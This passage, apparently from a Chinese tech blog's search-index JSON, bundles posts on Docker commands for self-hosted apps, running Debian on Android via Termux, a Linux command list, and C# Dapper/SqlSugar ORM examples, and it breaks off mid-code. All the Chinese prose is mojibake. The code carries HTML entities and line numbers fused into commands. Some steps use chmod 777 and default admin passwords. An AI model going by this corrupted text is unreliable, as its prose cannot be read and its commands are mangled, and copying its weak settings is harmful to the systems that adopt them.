æ˜¯å¦å¼€å¯æ— å¤´æ¨¡å¼ã€‚ é»˜è®¤æ˜¯ false ï¼Œå¯é€‰å€¼ï¼š true æˆ– false openbox. Next.js - React æ¡†æ¶çš„å…¨æ ˆè§£å†³æ–¹æ¡ˆNext.js æ˜¯ä¸€ä¸ªç”¨äºæ„å»ºæœåŠ¡å™¨æ¸²æŸ“çš„ React åº”ç”¨ç¨‹åºçš„æ¡†æ¶ã€‚å¯åŠ¨ä¸€ä¸ª Next.js å¼€å‘ç¯å¢ƒï¼š 123456docker run -it --name next-app -p 3000:3000 node:14 bash# åœ¨å®¹å™¨å†…æ‰§è¡Œä»¥ä¸‹å‘½ä»¤npx create-next-app my-appcd my-appnpm run dev drawioè¿™æ˜¯ä¸€ä¸ªé«˜äººæ°”çš„å…è´¹åœ¨çº¿å›¾è¡¨è½¯ä»¶ï¼Œç”¨äºåˆ›å»ºæµç¨‹å›¾ã€UML å›¾ã€æ¶æ„å›¾ç­‰ã€‚æ”¯æŒå¤šç§æ–‡ä»¶æ ¼å¼ï¼Œå¹¶ä¸”å¯ä»¥ä¸ Google Driveã€OneDrive ç­‰äº‘å­˜å‚¨æœåŠ¡é›†æˆï¼Œæ”¯æŒå®æ—¶åä½œç¼–è¾‘åŠŸèƒ½ã€‚åœ¨çº¿ä½¿ç”¨åœ°å€ï¼šhttps://app.diagrams.net/ 1docker run -it --rm --name=&quot;draw&quot; -p 8080:8080 -p 8443:8443 jgraph/drawio easyimageä¸€ä¸ªç®€å•çš„å›¾åºŠç¨‹åºï¼ŒåŠŸèƒ½ç®€å•ï¼Œæ— éœ€æ•°æ®åº“ã€‚ 1docker run -itd --name easyimage -p 8080:80 -e TZ=Asia/Shanghai -e PUID=1000 -e PGID=1000 -e DEBUG=false -v /share/Data/easyimage/config:/app/web/config -v /share/Data/easyimage/i:/app/web/i ddsderek/easyimage:latest Nekoè¿™æ˜¯ä¸€ä¸ªåœ¨ Docker ä¸­è¿è¡Œå¹¶ä½¿ç”¨ WebRTC æŠ€æœ¯çš„è‡ªæ‰˜ç®¡è™šæ‹Ÿæµè§ˆå™¨ã€‚Neko æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å·¥å…·ï¼Œå…è®¸æ‚¨åœ¨è™šæ‹Ÿç¯å¢ƒä¸­è¿è¡ŒåŠŸèƒ½é½å…¨çš„æµè§ˆå™¨ï¼Œä½¿æ‚¨èƒ½å¤Ÿä»ä»»ä½•åœ°æ–¹å®‰å…¨ã€ç§å¯†åœ°è®¿é—®äº’è”ç½‘ã€‚å€ŸåŠ© Nekoï¼Œæ‚¨å¯ä»¥åƒåœ¨å¸¸è§„æµè§ˆå™¨ä¸Šä¸€æ ·æµè§ˆç½‘é¡µã€è¿è¡Œåº”ç”¨ç¨‹åºå¹¶æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œæ‰€æœ‰è¿™äº›éƒ½åœ¨å®‰å…¨ä¸”éš”ç¦»çš„ç¯å¢ƒä¸­è¿›è¡Œã€‚æ— è®ºæ‚¨æ˜¯æƒ³è¦æµ‹è¯• Web åº”ç”¨ç¨‹åºçš„å¼€å‘äººå‘˜ã€å¯»æ±‚å®‰å…¨æµè§ˆä½“éªŒçš„æ³¨é‡éšç§çš„ç”¨æˆ·ï¼Œè¿˜æ˜¯åªæ˜¯æƒ³è¦åˆ©ç”¨è™šæ‹Ÿæµè§ˆå™¨çš„ä¾¿åˆ©æ€§å’Œçµæ´»æ€§çš„äººï¼ŒNeko æ˜¯å®Œç¾çš„è§£å†³æ–¹æ¡ˆã€‚ 1234567891011121314docker run -d \\ --restart always \\ --name neko \\ --shm-size=&quot;2gb&quot; \\ -p 8080:8080 \\ -p 52000-52100:52000-52100/udp \\ -e NEKO_PASSWORD=&#x27;neko&#x27; \\ -e NEKO_PASSWORD_ADMIN=&#x27;admin&#x27; \\ -e NEKO_NAT1TO1=43.156.38.52 \\ -e NEKO_SCREEN=1920x1080@30 \\ -e NEKO_ICELITE=1 \\ -e NEKO_EPR=52000-52100 \\ m1k1o/neko:latest speedtest-xç½‘é€Ÿæµ‹è¯• 12docker run -d --name speedtest-x --restart always -p 9001:80 -it badapple9/speedtest-x myspeed ç½‘é€Ÿæµ‹è¯•1234567docker run -d \\ --restart always \\ --name myspeed \\ -p 8080:5216 \\ -v /data/myspeed/data:/myspeed/data \\ germannewsmaker/myspeed SurveyKingè°ƒæŸ¥é—®å·ç³»ç»Ÿå’Œè€ƒè¯•ç³»ç»Ÿ1docker run -d --name SurveyKing --restart always -p 8080:1991 surveyking/surveyking admin 123456 é©¾è€ƒè€ƒè¯•&#x2F;é—®å· EnBizCardåŸºäº HTML çš„äº¤äº’å¼å’Œå“åº”å¼æ•°å­—åç‰‡ã€‚ 123456docker run -d \\ --restart unless-stopped \\ --name enbizcard \\ -p 5600:80 \\ swr.cn-north-4.myhuaweicloud.com/jeven/enbizcard SyncTVä¸€èµ·çœ‹è§†é¢‘ 1234567891011docker run -d --name synctv -p 8080:8080 synctvorg/synctvdocker run -d \\ \\--name briefing \\-v /datar/briefing/data:/app/data \\-p 8080:8080 \\--restart always \\holtwick/briefing go-file å›¾åºŠ1234mkdir -p /data/go-file/datachmod -R 777 /data/go-file/docker run -d --restart always -p 8080:3000 -e TZ=Asia/Shanghai -v /data/go-file/data:/data justsong/go-file Adminer è½»é‡çº§çš„ MySQL ç®¡ç†å·¥å…·1docker run --name adminer -d -p 8080:8080 adminer Docker Composeä½¿ç”¨ Docker Compose æ¥å¯åŠ¨ä¸€ä¸ªåŒ…å« Nginx å’Œ PHP-FPM çš„ WordPress ç¯å¢ƒã€‚ æ­¥éª¤ 1: å®‰è£… Docker å’Œ Docker Composeé¦–å…ˆï¼Œç¡®ä¿ä½ å·²ç»åœ¨æœºå™¨ä¸Šå®‰è£…äº† Docker å’Œ Docker Composeã€‚ å®‰è£… Dockeræ‰“å¼€ç»ˆç«¯æˆ–å‘½ä»¤æç¤ºç¬¦ã€‚æ ¹æ®æ“ä½œç³»ç»Ÿï¼ŒæŒ‰ç…§å®˜æ–¹æ–‡æ¡£å®‰è£… Dockerï¼šUbuntu: 12345sudo apt-get updatesudo apt-get install docker.ioMacOS: ä¸‹è½½å¹¶å®‰è£… Docker Desktop for MacWindows: ä¸‹è½½å¹¶å®‰è£… Docker Desktop for Windowså®‰è£… Docker Compose åœ¨ç»ˆç«¯æˆ–å‘½ä»¤æç¤ºç¬¦ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 123sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-composesudo chmod +x /usr/local/bin/docker-composedocker-compose --version æ­¥éª¤ 2: åˆ›å»ºé¡¹ç›®ç›®å½•åˆ›å»ºä¸€ä¸ªæ–°çš„ç›®å½•æ¥å­˜æ”¾é¡¹ç›®æ–‡ä»¶ï¼š 12mkdir wordpress-projectcd wordpress-project æ­¥éª¤ 3: åˆ›å»º docker-compose.yml æ–‡ä»¶ä½¿ç”¨ä½ å–œæ¬¢çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼ˆå¦‚ nano æˆ– vimï¼‰åˆ›å»º docker-compose.yml æ–‡ä»¶ï¼š 1nano docker-compose.yml å°†ä»¥ä¸‹å†…å®¹å¤åˆ¶å¹¶ç²˜è´´åˆ° docker-compose.yml æ–‡ä»¶ä¸­ï¼š123456789101112131415161718192021222324252627version: &#x27;3&#x27;services: db: image: mysql:5.7 volumes: - db_data:/var/lib/mysql restart: always environment: MYSQL_ROOT_PASSWORD: somewordpress MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress wordpress: depends_on: - db image: wordpress:latest ports: - &quot;8000:80&quot; restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpressvolumes: db_data: ä¿å­˜å¹¶å…³é—­æ–‡ä»¶ã€‚ æ­¥éª¤ 4: å¯åŠ¨ Docker Composeåœ¨ç»ˆç«¯æˆ–å‘½ä»¤æç¤ºç¬¦ä¸­ï¼Œå¯¼èˆªåˆ°é¡¹ç›®ç›®å½•ï¼š 1cd wordpress-project è¿è¡Œä»¥ä¸‹å‘½ä»¤å¯åŠ¨ Docker Composeï¼š1docker-compose up -d -d å‚æ•°è¡¨ç¤ºåœ¨åå°è¿è¡Œå®¹å™¨ã€‚ æ­¥éª¤ 5: è®¿é—® WordPressæ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—® http://localhost:8000ã€‚çœ‹åˆ° WordPress çš„å®‰è£…é¡µé¢ã€‚æŒ‰ç…§æç¤ºå®Œæˆå®‰è£…è¿‡ç¨‹ã€‚ æ­¥éª¤ 6: åœæ­¢å’Œåˆ é™¤å®¹å™¨å¦‚æœä½ éœ€è¦åœæ­¢å’Œåˆ é™¤æ‰€æœ‰å®¹å™¨ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1docker-compose down version: â€˜3â€™: æŒ‡å®š Docker Compose æ–‡ä»¶çš„ç‰ˆæœ¬ã€‚services: å®šä¹‰äº†å¤šä¸ªæœåŠ¡ï¼Œæ¯ä¸ªæœåŠ¡å¯¹åº”ä¸€ä¸ªå®¹å™¨ã€‚db: å®šä¹‰äº†ä¸€ä¸ª MySQL æ•°æ®åº“æœåŠ¡ã€‚image: mysql:5.7: ä½¿ç”¨ MySQL 5.7 é•œåƒã€‚volumes: å°†ä¸»æœºä¸Šçš„ db_data å·æŒ‚è½½åˆ°å®¹å™¨çš„ &#x2F;var&#x2F;lib&#x2F;mysql ç›®å½•ã€‚environment: è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå¦‚æ•°æ®åº“å¯†ç å’Œç”¨æˆ·åã€‚wordpress: å®šä¹‰äº†ä¸€ä¸ª WordPress æœåŠ¡ã€‚depends_on: æŒ‡å®šè¯¥æœåŠ¡ä¾èµ–äº db æœåŠ¡ã€‚image: wordpress:latest: ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„ WordPress é•œåƒã€‚ports: å°†ä¸»æœºçš„ 8000 ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ 80 ç«¯å£ã€‚environment: è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå¦‚æ•°æ®åº“ä¸»æœºåœ°å€å’Œç”¨æˆ·åã€‚volumes: å®šä¹‰äº†æ•°æ®å·ï¼Œç”¨äºæŒä¹…åŒ–æ•°æ®ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"android run linux","slug":"android-run-linux","date":"2024-10-26T14:39:32.000Z","updated":"2024-12-03T18:10:44.564Z","comments":true,"path":"2024/10/26/android-run-linux/","permalink":"https://banjinmei.github.io/2024/10/26/android-run-linux/","excerpt":"","text":"åœ¨å®‰å“ä¸­è¿è¡ŒlinuxAnLinux-Apphttps://github.com/EXALAB/AnLinux-Appdownload anlinux å®‰è£…å®Œé€‰æ‹©å®‰è£…çš„linuxç³»ç»Ÿ å¤åˆ¶å¯åŠ¨&#x2F;å®‰è£…å‘½ä»¤ å®‰è£…termuxï¼ˆå¦‚æœæ²¡è£…ï¼‰https://github.com/termux/termux-app ï¼ˆå®‰è£…å¥½äº†ä¹‹åï¼Œè¿›å…¥termuxç•Œé¢ï¼š æ‰§è¡Œtermux-setup-storage æ¥ç”³è¯·ä¸€ä¸‹å†…å­˜å¡æƒé™ ç„¶ååŒæ„å°±è¡Œäº†ï¼Œä¹‹åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1pkg update &amp;&amp; pkg upgradeï¼‰ å¯åŠ¨ ç²˜è´´è¿è¡Œå‘½ä»¤ å®‰è£…å®Œ 1./start-debian.sh å¯åŠ¨ debian æŸ¥IP1234567suapt updateapt install sudosudo apt install net-toolsifconfig ä¿®æ”¹å¯†ç 12345678910su# è¾“å…¥å½“å‰ root ç”¨æˆ·çš„å¯†ç passwd# è¾“å…¥æ–°å¯†ç Enter new UNIX password:# å†æ¬¡è¾“å…¥æ–°å¯†ç ä»¥ç¡®è®¤Retype new UNIX password:# ç¡®è®¤å¯†ç æ›´æ”¹æˆåŠŸpasswd: password updated successfullyexit linux å‘½ä»¤1ï¼šæ–‡ä»¶ç®¡ç† mvå‘½ä»¤ â€“ ç§»åŠ¨æˆ–æ”¹åæ–‡ä»¶ lså‘½ä»¤ â€“ æ˜¾ç¤ºç›®å½•ä¸­æ–‡ä»¶åŠå…¶å±æ€§ä¿¡æ¯ cpå‘½ä»¤ â€“ å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½• mkdirå‘½ä»¤ â€“ åˆ›å»ºç›®å½•æ–‡ä»¶ pwdå‘½ä»¤ â€“ æ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•çš„è·¯å¾„ tarå‘½ä»¤ â€“ å‹ç¼©å’Œè§£å‹ç¼©æ–‡ä»¶ cdå‘½ä»¤ â€“ åˆ‡æ¢ç›®å½• chmodå‘½ä»¤ â€“ æ”¹å˜æ–‡ä»¶æˆ–ç›®å½•æƒé™2ï¼šæ–‡æ¡£ç¼–è¾‘ catå‘½ä»¤ â€“ åœ¨ç»ˆç«¯è®¾å¤‡ä¸Šæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ grepå‘½ä»¤ â€“ å¼ºå¤§çš„æ–‡æœ¬æœç´¢å·¥å…· rmå‘½ä»¤ â€“ åˆ é™¤æ–‡ä»¶æˆ–ç›®å½• echoå‘½ä»¤ â€“ è¾“å‡ºå­—ç¬¦ä¸²æˆ–æå–åçš„å˜é‡å€¼ tailå‘½ä»¤ â€“ æŸ¥çœ‹æ–‡ä»¶å°¾éƒ¨å†…å®¹ rmdirå‘½ä»¤ â€“ åˆ é™¤ç©ºç›®å½•æ–‡ä»¶ sedå‘½ä»¤ â€“ æ‰¹é‡ç¼–è¾‘æ–‡æœ¬æ–‡ä»¶ viå‘½ä»¤ â€“ æ–‡æœ¬ç¼–è¾‘å™¨3ï¼šç³»ç»Ÿç®¡ç† findå‘½ä»¤ â€“ æ ¹æ®è·¯å¾„å’Œæ¡ä»¶æœç´¢æŒ‡å®šæ–‡ä»¶ rpmå‘½ä»¤ â€“ RPMè½¯ä»¶åŒ…ç®¡ç†å™¨ pså‘½ä»¤ â€“ æ˜¾ç¤ºè¿›ç¨‹çŠ¶æ€ startxå‘½ä»¤ â€“ åˆå§‹åŒ–X-windowç³»ç»Ÿ unameå‘½ä»¤ â€“ æ˜¾ç¤ºç³»ç»Ÿå†…æ ¸ä¿¡æ¯ killå‘½ä»¤ â€“ æ€æ­»è¿›ç¨‹ resize2fså‘½ä»¤ â€“ åŒæ­¥æ–‡ä»¶ç³»ç»Ÿå®¹é‡åˆ°å†…æ ¸ useraddå‘½ä»¤ â€“ åˆ›å»ºå¹¶è®¾ç½®ç”¨æˆ·ä¿¡æ¯4ï¼šç£ç›˜ç®¡ç† dfå‘½ä»¤ â€“ æ˜¾ç¤ºç£ç›˜ç©ºé—´ä½¿ç”¨é‡æƒ…å†µ fdiskå‘½ä»¤ â€“ ç®¡ç†ç£ç›˜åˆ†åŒº lsblkå‘½ä»¤ â€“ æŸ¥çœ‹ç³»ç»Ÿçš„ç£ç›˜ä½¿ç”¨æƒ…å†µ mkfs.ext4 å‘½ä»¤ â€“ å¯¹ç£ç›˜è®¾å¤‡è¿›è¡ŒEXT4æ ¼å¼åŒ– vgextendå‘½ä»¤ â€“ æ‰©å±•å·ç»„è®¾å¤‡ hdparmå‘½ä»¤ â€“ æ˜¾ç¤ºä¸è®¾å®šç¡¬ç›˜å‚æ•° pvcreateå‘½ä»¤ â€“ åˆ›å»ºç‰©ç†å·è®¾å¤‡ lvcreateå‘½ä»¤ â€“ åˆ›å»ºé€»è¾‘å·è®¾å¤‡5ï¼šæ–‡ä»¶ä¼ è¾“ tftpå‘½ä»¤ â€“ ä¸Šä¼ åŠä¸‹è½½æ–‡ä»¶ curlå‘½ä»¤ â€“ æ–‡ä»¶ä¼ è¾“å·¥å…· fsckå‘½ä»¤ â€“ æ£€æŸ¥ä¸ä¿®å¤æ–‡ä»¶ç³»ç»Ÿ rsyncå‘½ä»¤ â€“ è¿œç¨‹æ•°æ®åŒæ­¥å·¥å…· lprmå‘½ä»¤ â€“ ç§»é™¤æ‰“å°é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡ ftpwhoå‘½ä»¤ â€“ æ˜¾ç¤ºFTPä¼šè¯ä¿¡æ¯ ftpå‘½ä»¤ â€“ æ–‡ä»¶ä¼ è¾“åè®®å®¢æˆ·ç«¯ lftpå‘½ä»¤ â€“ ä¼˜ç§€çš„å‘½ä»¤è¡ŒFTPå®¢æˆ·ç«¯6ï¼šç½‘ç»œé€šè®¯ sshå‘½ä»¤ â€“ å®‰å…¨çš„è¿œç¨‹è¿æ¥æœåŠ¡ netstatå‘½ä»¤ â€“ æ˜¾ç¤ºç½‘ç»œçŠ¶æ€ dhclientå‘½ä»¤ â€“ åŠ¨æ€è·å–æˆ–é‡Šæ”¾IPåœ°å€ ifconfigå‘½ä»¤ â€“ æ˜¾ç¤ºæˆ–è®¾ç½®ç½‘ç»œè®¾å¤‡å‚æ•°ä¿¡æ¯ pingå‘½ä»¤ â€“ æµ‹è¯•ä¸»æœºé—´ç½‘ç»œè¿é€šæ€§ sshdå‘½ä»¤ â€“ opensshæœåŠ¡å™¨å®ˆæŠ¤è¿›ç¨‹ smbpasswdå‘½ä»¤ â€“ ä¿®æ”¹ç”¨æˆ·çš„SMBå¯†ç  iptableså‘½ä»¤ â€“ é˜²ç«å¢™ç­–ç•¥ç®¡ç†å·¥å…·7ï¼šè®¾å¤‡ç®¡ç† mountå‘½ä»¤ â€“ å°†æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°ç›®å½• lspciå‘½ä»¤ â€“ æ˜¾ç¤ºå½“å‰è®¾å¤‡PCIæ€»çº¿è®¾å¤‡ä¿¡æ¯ sensorså‘½ä»¤ â€“ æ£€æµ‹æœåŠ¡å™¨ç¡¬ä»¶ä¿¡æ¯ rfkillå‘½ä»¤ â€“ ç®¡ç†è“ç‰™å’ŒWi-Fiè®¾å¤‡ setledså‘½ä»¤ â€“ è®¾ç½®é”®ç›˜çš„LEDç¯å…‰çŠ¶æ€ setpciå‘½ä»¤ â€“ é…ç½®PCIç¡¬ä»¶è®¾å¤‡å‚æ•° hciconfigå‘½ä»¤ â€“ é…ç½®è“ç‰™è®¾å¤‡ lsusbå‘½ä»¤ â€“ æ˜¾ç¤ºUSBè®¾å¤‡åˆ—è¡¨8ï¼šå¤‡ä»½å‹ç¼© zipå‘½ä»¤ â€“ å‹ç¼©æ–‡ä»¶ gzipå‘½ä»¤ â€“ å‹ç¼©å’Œè§£å‹æ–‡ä»¶ unzipå‘½ä»¤ â€“ è§£å‹ç¼©zipæ ¼å¼æ–‡ä»¶ zipinfoå‘½ä»¤ â€“ æŸ¥çœ‹å‹ç¼©æ–‡ä»¶ä¿¡æ¯ gunzipå‘½ä»¤ â€“ è§£å‹æå–æ–‡ä»¶å†…å®¹ unarjå‘½ä»¤ â€“ è§£å‹.arjæ–‡ä»¶ zipsplitå‘½ä»¤ â€“ åˆ†å‰²å‹ç¼©åŒ… dumpå‘½ä»¤ â€“ å¤‡ä»½æ–‡ä»¶ç³»ç»Ÿ9ï¼šå…¶ä»–å‘½ä»¤ wgetå‘½ä»¤ â€“ ä¸‹è½½ç½‘ç»œæ–‡ä»¶ historyå‘½ä»¤ â€“ æ˜¾ç¤ºä¸ç®¡ç†å†å²å‘½ä»¤è®°å½• hashå‘½ä»¤ â€“ ç®¡ç†å‘½ä»¤è¿è¡Œæ—¶æŸ¥è¯¢çš„å“ˆå¸Œè¡¨ waitå‘½ä»¤ â€“ ç­‰å¾…æŒ‡ä»¤æ‰§è¡Œå®Œæ¯• bcå‘½ä»¤ â€“ æ•°å­—è®¡ç®—å™¨ rmmodå‘½ä»¤ â€“ ç§»é™¤å†…æ ¸æ¨¡å— pigzå‘½ä»¤ â€“ å¤šçº¿ç¨‹çš„è§£å‹ç¼©æ–‡ä»¶ xargså‘½ä»¤ â€“ ç»™å…¶ä»–å‘½ä»¤ä¼ å‚æ•°çš„è¿‡æ»¤å™¨ linuxå‘½ä»¤ linuxå¸¸ç”¨å‘½ä»¤","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"}],"author":"mu"},{"title":".net orm","slug":"net-orm","date":"2024-10-26T14:35:57.000Z","updated":"2025-03-16T15:30:01.912Z","comments":true,"path":"2024/10/26/net-orm/","permalink":"https://banjinmei.github.io/2024/10/26/net-orm/","excerpt":"","text":"SqlSugarnuget å®‰è£… SqlSugar å®‰è£… MySql.Data å®ä½“ç±» 123456789101112131415[SugarTable(&quot;IMMenu&quot;)]class IMMenu&#123; [SugarColumn(IsPrimaryKey = true, IsIdentity = true)] //id public int id &#123; get; set; &#125; public string name &#123; get; set; &#125; // å…¶ä»–å±æ€§... public override string ToString() &#123; return $&quot;id: &#123;id&#125;, name: &#123;name&#125;&quot;; &#125;&#125; ä½¿ç”¨ 123456789101112131415161718// è¿æ¥å­—ç¬¦ä¸²string connectionString = &quot;server=xxx;user=root;password=xxx;database=DB&quot;;// åˆ›å»ºSqlSugarå®¢æˆ·ç«¯å®ä¾‹SqlSugarClient db = new SqlSugarClient(new ConnectionConfig()&#123; ConnectionString = connectionString, DbType = DbType.MySql, IsAutoCloseConnection = true, InitKeyType = InitKeyType.Attribute&#125;);// æŸ¥è¯¢æ•°æ®var data = db.Queryable&lt;IMMenu&gt;().ToList();// è¾“å‡ºç»“æœdata.ForEach(item =&gt; Console.WriteLine(item.ToString())); dapper123456789101112131415161718192021public class IMMenu&#123; public int id &#123; get; set; &#125; public string name &#123; get; set; &#125; &#125;public class DapperExample&#123; public static IEnumerable&lt;IMMenu&gt; GetAllIMMenus(string connectionString) &#123; using (IDbConnection db = new MySqlConnection(connectionString)) &#123; return db.Query&lt;IMMenu&gt;(&quot;SELECT * FROM IMMenu&quot;); &#125; &#125;&#125; 1234567 string connectionString = &quot;server=xxx;user=root;password=xxx;database=DB&quot;;IEnumerable&lt;IMMenu&gt; ms = DapperExample.GetAllIMMenus(connectionString);foreach (var m in ms)&#123; Console.WriteLine($&quot;Id: &#123;m.id&#125;, Name: &#123;m.name&#125;&quot;);&#125; ä½¿ç”¨ Dapper è¿›è¡Œæ•°æ®æ˜ å°„Dapper æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰æ¡†æ¶ï¼Œå®ƒå¯ä»¥ç›´æ¥å°†æŸ¥è¯¢ç»“æœæ˜ å°„åˆ°å¯¹è±¡åˆ—è¡¨ï¼Œæ€§èƒ½éå¸¸é«˜ã€‚é¦–å…ˆï¼Œä½ éœ€è¦é€šè¿‡ NuGet åŒ…ç®¡ç†å™¨å®‰è£… Dapper å’Œ MySqlConnectorï¼ˆå¦‚æœä½¿ç”¨ MySQL æ•°æ®åº“ï¼‰ã€‚ 12345678910111213141516171819202122using Dapper;using MySqlConnector;using System.Collections.Generic;// å‡è®¾ IMMsgState ç±»çš„å®šä¹‰å¦‚ä¸‹public class IMMsgState&#123; public int Id &#123; get; set; &#125; public string Message &#123; get; set; &#125; // å…¶ä»–å±æ€§...&#125;public class DatabaseHelper&#123; public static List&lt;IMMsgState&gt; QueryIMMsgState(string connectionString, string sql) &#123; using (var connection = new MySqlConnection(connectionString)) &#123; return connection.Query&lt;IMMsgState&gt;(sql).AsList(); &#125; &#125;&#125; 123string connectionString = &quot;your_connection_string&quot;;string sql = &quot;SELECT * FROM your_table&quot;;List&lt;IMMsgState&gt; result = DatabaseHelper.QueryIMMsgState(connectionString, sql); åˆ†é¡µæŸ¥è¯¢å¦‚æœæ•°æ®é‡éå¸¸å¤§ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨åˆ†é¡µæŸ¥è¯¢ï¼Œæ¯æ¬¡åªæŸ¥è¯¢éƒ¨åˆ†æ•°æ®ï¼Œå‡å°‘å•æ¬¡æŸ¥è¯¢çš„æ•°æ®é‡ã€‚sqlâ€“ MySQL åˆ†é¡µæŸ¥è¯¢ç¤ºä¾‹SELECT * FROM your_table LIMIT @Offset, @Limit; 123456789int pageIndex = 1;int pageSize = 100;string sql = &quot;SELECT * FROM your_table LIMIT @Offset, @Limit&quot;;var parameters = new &#123; Offset = (pageIndex - 1) * pageSize, Limit = pageSize &#125;;using (var connection = new MySqlConnection(connectionString))&#123; var result = connection.Query&lt;IMMsgState&gt;(sql, parameters).AsList();&#125; é€šè¿‡ä»¥ä¸Šæ–¹æ³•ï¼Œå¯ä»¥æ˜¾è‘—æé«˜å¤„ç†å¤§é‡æ•°æ®æ—¶çš„æ€§èƒ½ã€‚æ‰‹åŠ¨æ˜ å°„å’Œä½¿ç”¨ Dapper éƒ½èƒ½é¿å… JSON åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å¼€é”€ï¼Œè€Œåˆ†é¡µæŸ¥è¯¢åˆ™å¯ä»¥å‡å°‘å•æ¬¡æŸ¥è¯¢çš„æ•°æ®é‡ï¼Œé™ä½å†…å­˜å‹åŠ›ã€‚ å¤šè¡¨è¿æ¥æŸ¥è¯¢å½“éœ€è¦ä»å¤šä¸ªè¡¨ä¸­è·å–æ•°æ®æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ SQL çš„è¿æ¥æ“ä½œï¼Œå¹¶é€šè¿‡ Dapper å°†ç»“æœæ˜ å°„åˆ°è‡ªå®šä¹‰çš„å¯¹è±¡æˆ–å¯¹è±¡é›†åˆä¸­ã€‚ç¤ºä¾‹ä»£ç å‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ªè¡¨ï¼šUsers å’Œ Ordersï¼ŒUsers è¡¨å­˜å‚¨ç”¨æˆ·ä¿¡æ¯ï¼ŒOrders è¡¨å­˜å‚¨è®¢å•ä¿¡æ¯ï¼Œå¹¶ä¸”é€šè¿‡ UserId å…³è”ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657using Dapper;using MySqlConnector;using System;using System.Collections.Generic;using System.Data;// ç”¨æˆ·ç±»public class User&#123; public int Id &#123; get; set; &#125; public string Name &#123; get; set; &#125; public List&lt;Order&gt; Orders &#123; get; set; &#125;&#125;// è®¢å•ç±»public class Order&#123; public int Id &#123; get; set; &#125; public string OrderNumber &#123; get; set; &#125; public int UserId &#123; get; set; &#125;&#125;class Program&#123; static void Main() &#123; string connectionString = &quot;your_connection_string&quot;; using (IDbConnection db = new MySqlConnection(connectionString)) &#123; string sql = @&quot;SELECT u.Id, u.Name, o.Id as OrderId, o.OrderNumber, o.UserId FROM Users u LEFT JOIN Orders o ON u.Id = o.UserId&quot;; var userDictionary = new Dictionary&lt;int, User&gt;(); var users = db.Query&lt;User, Order, User&gt;(sql, (user, order) =&gt; &#123; if (!userDictionary.TryGetValue(user.Id, out var currentUser)) &#123; currentUser = user; currentUser.Orders = new List&lt;Order&gt;(); userDictionary.Add(currentUser.Id, currentUser); &#125; if (order != null) &#123; currentUser.Orders.Add(order); &#125; return currentUser; &#125;, splitOn: &quot;OrderId&quot;); var result = users.AsList(); foreach (var user in result) &#123; Console.WriteLine($&quot;User: &#123;user.Name&#125;, Orders Count: &#123;user.Orders.Count&#125;&quot;); &#125; &#125; &#125;&#125; è§£é‡ŠQuery æ–¹æ³•çš„ç¬¬ä¸€ä¸ªæ³›å‹å‚æ•° User è¡¨ç¤ºç¬¬ä¸€ä¸ªç»“æœé›†æ˜ å°„çš„ç±»å‹ï¼Œç¬¬äºŒä¸ªæ³›å‹å‚æ•° Order è¡¨ç¤ºç¬¬äºŒä¸ªç»“æœé›†æ˜ å°„çš„ç±»å‹ï¼Œæœ€åä¸€ä¸ªæ³›å‹å‚æ•° User è¡¨ç¤ºæœ€ç»ˆè¿”å›çš„ç±»å‹ã€‚splitOn å‚æ•°æŒ‡å®šäº†ç”¨äºåˆ†å‰²ç»“æœé›†çš„åˆ—åï¼Œè¿™é‡Œæ˜¯ OrderIdã€‚é€šè¿‡ Dictionary æ¥é¿å…é‡å¤åˆ›å»º User å¯¹è±¡ï¼Œå°†æ¯ä¸ªç”¨æˆ·çš„è®¢å•ä¿¡æ¯æ·»åŠ åˆ°å¯¹åº”çš„ User å¯¹è±¡ä¸­ã€‚ å­˜å‚¨è¿‡ç¨‹è°ƒç”¨Dapper å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è°ƒç”¨æ•°æ®åº“ä¸­çš„å­˜å‚¨è¿‡ç¨‹ã€‚ 12345678910111213141516171819202122232425262728293031using Dapper;using MySqlConnector;using System;using System.Data;// å­˜å‚¨è¿‡ç¨‹è¿”å›çš„ç»“æœç±»public class ProcedureResult&#123; public int Id &#123; get; set; &#125; public string Name &#123; get; set; &#125;&#125;class Program&#123; static void Main() &#123; string connectionString = &quot;your_connection_string&quot;; using (IDbConnection db = new MySqlConnection(connectionString)) &#123; var parameters = new DynamicParameters(); parameters.Add(&quot;@Param1&quot;, &quot;value1&quot;); parameters.Add(&quot;@Param2&quot;, 123); var results = db.Query&lt;ProcedureResult&gt;(&quot;YourStoredProcedureName&quot;, parameters, commandType: CommandType.StoredProcedure); foreach (var result in results) 